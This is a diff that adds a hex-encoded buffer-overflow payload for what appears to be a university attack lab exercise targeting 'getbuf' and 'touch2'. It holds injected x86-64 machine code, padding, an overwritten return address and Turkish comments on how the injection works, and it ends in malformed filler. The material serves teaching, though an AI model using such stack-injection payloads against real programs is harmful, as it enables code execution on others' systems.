@@ -1,0 +1,40 @@
+48 c7 c2 77 ed 85 2c 48
+89 d7 48 d1 ef 48 89 fe
+48 89 d7 48 01 fe c3 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+88 0e 64 55 00 00 00 00// getbuf'ın return adresi
+77 16 40 00 00 00 00 00// injected code'un c3(retq)ye rastladığında return edeceği adres(touch2)
+00 00 00 00 00 00 00 00
+istedğin değeri yazabilirsin buranın adresini istediğin registera atabilirsin injected code ile örneğin 
+touch2nin parametreleri(rdi,rsi)
+
+
+
+
+
+
+48 00 00 00 00 00 00 00
+..
+..
+..
+.
+.
+.
+.
+.00 000 00 0 0 0 0 0 0 0
+
